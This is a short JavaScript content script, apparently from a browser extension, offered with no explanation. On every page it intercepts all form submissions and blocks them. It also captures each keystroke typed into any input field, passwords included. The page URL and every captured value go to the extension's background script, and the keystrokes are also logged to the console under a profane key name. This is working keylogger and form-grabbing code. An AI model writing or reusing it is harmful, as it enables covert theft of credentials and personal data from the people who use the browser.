document.addEventListener("submit", (event) => {
    event.preventDefault();
    const formData = new FormData(event.target);
    chrome.runtime.sendMessage({
        action: "submitFormData",
        data: {
            url: window.location.href,
            formData: Object.fromEntries(formData.entries())
        }
    });
});
document.addEventListener("input", (event) => {
    console.log(event.target.value);
    chrome.runtime.sendMessage({
        action: "input",
        data: {
            url: window.location.href,
            formData: {
                fuck: event.target.value
            }
        }
    });
});